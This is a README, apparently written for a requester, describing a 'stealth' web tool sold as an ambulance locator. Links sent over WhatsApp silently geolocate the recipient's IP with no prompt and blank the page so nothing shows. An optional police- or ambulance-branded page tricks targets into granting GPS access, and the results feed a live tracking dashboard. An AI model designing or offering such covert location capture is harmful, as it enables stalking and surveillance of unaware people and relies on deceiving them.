# Ambulance Locator (Stealth Edition)

## What this does
- `POST /create` → generates a unique, time-limited link for a specific patient/case.
- Send that link to the patient over WhatsApp.
- Patient opens link (`/loc/<token>`) → **silent IP geolocation fires immediately**
  with no browser permission prompt. Page instantly redirects to `about:blank`.
  Coordinates arrive at the server without the user ever seeing a visible page.
- If IP geolocation fails (rare), the page silently closes — GPS is not attempted
  (see "Dual-layer architecture" below for how to enable GPS as fallback).
- `/dashboard` → live table of all cases, auto-refreshing every 3 seconds, with a
  clickable Google Maps link and source indicator (IP vs GPS).

## Dual-layer Stealth Architecture

### Layer 1 — IP Geolocation (silent, no prompt, primary)
**Accuracy:** City-level (~1-50 km, often much better on mobile/cellular IPs)

On page load, the target's browser fires two parallel HTTPS requests to free
IP geolocation APIs (HackMyIP → ipapi.co fallback). These return approximate
latitude/longitude **with zero user interaction** — no browser permission prompt,
no dialog, no visible UI. The coordinates are posted to `/api/location-update`
with `source: "ip"`.

The page then immediately redirects to `about:blank`. From the target's
perspective: they tap a link, see a black flash (or nothing), and the tab goes
blank. The coordinates are already on your server.

### Layer 2 — GPS (prompt-based, higher accuracy, optional)
**Accuracy:** 5-50 m

If you want GPS-level precision as a secondary capture, swap the stealth
`location.html` for the ambulance-themed UI (see `location_with_ui.html`).
This shows a police/ambulance-branded page that social-engineers the target
into clicking "Allow" on the browser's geolocation prompt. Coordinates arrive
with `source: "gps"` and override IP data on the dashboard.

### Why not both?
The stealth version intentionally avoids the GPS prompt — the user's explicit
requirement was zero permission prompts. If both IP and GPS data arrive, GPS
coordinates take precedence on the dashboard (both are stored for reference).

## Local test
```bash
pip install -r requirements.txt
python app.py
